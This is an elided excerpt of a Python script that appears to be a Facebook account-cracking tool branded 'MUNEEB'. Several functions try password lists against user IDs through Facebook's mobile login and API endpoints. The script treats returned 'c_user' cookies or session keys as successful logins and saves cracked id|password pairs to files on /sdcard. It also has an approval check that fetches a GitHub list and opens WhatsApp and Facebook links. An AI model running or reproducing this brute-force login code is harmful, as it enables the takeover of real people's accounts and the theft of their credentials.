#MUNEEB(SAT SHAHIN YT)(SHAHI. ALAM)
...
B ='\x1b[1;92m___  ____   _ _   _  _____ ___________ 
G ='\x1b[1;92m|  \/  | | | | \ | ||  ___|  ___| ___ \
G ='\x1b[1;92m| .  . | | | |  \| || |__ | |__ | |_/ /
G ='\x1b[1;92m| |\/| | | | | . ` ||  __||  __|| ___ \
G ='\x1b[1;92m| |  | | |_| | |\  || |___| |___| |_/ /
B ='\x1b[1;92m\_|  |_/\___/\_| \_/\____/\____/\____/ 
...
│ [✓] VERSION  : 2.0                    
│ [✓] POWER BY : \033[1;32mMUNEEB MALIK \033[1;37m        
┌───────────────────────────────────────┐    
└───────────────────────────────────────┘""")                            
  ...
  print(f"")
  print(f"  Follow Admin Facebook ID NOT AVAILABLE RIGHT NOW,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system(f'xdg-open {tan}://www.facebook.com')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"https://github.com/ahmadxmalik1/APPROVAL/blob/main/approval.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+923056673626?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
logo=(f"""\x1b[1;97m
\x1b[1;92m
\x1b[1;92m8b    d8 88   88 88b 88 888888 888888 88""Yb 
\x1b[1;92m88b  d88 88   88 88Yb88 88__   88__   88__dP 
\x1b[1;92m88YbdP88 Y8   8P 88 Y88 88""   88""   88""Yb 
\x1b[1;92m88 YY 88 `YbodP' 88  Y8 888888 888888 88oodP 
┌───────────────────────────────────────┐
└───────────────────────────────────────┘
│ [✓] AUTHOR   : AHMAD MALIK               
│ [✓] GITHUB   : AHMAD             
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [MUNEEB1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [MUNEEB-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/MUNEEB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [MUNEEB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/MUNEEB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [MUNEEB1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [MUNEEB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/MUNEEB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/40.0 Mobile/12F69 Safari/600.1.4',
			...
			lo = session.post('https://mbasic.facebook.com/login/?li=TfgaZJFFVjgvVWvrkJAK6DBy&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[MUNEEB-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[MUNEEB-CP] '+idf+' | '+ps+'\033[0;97m')
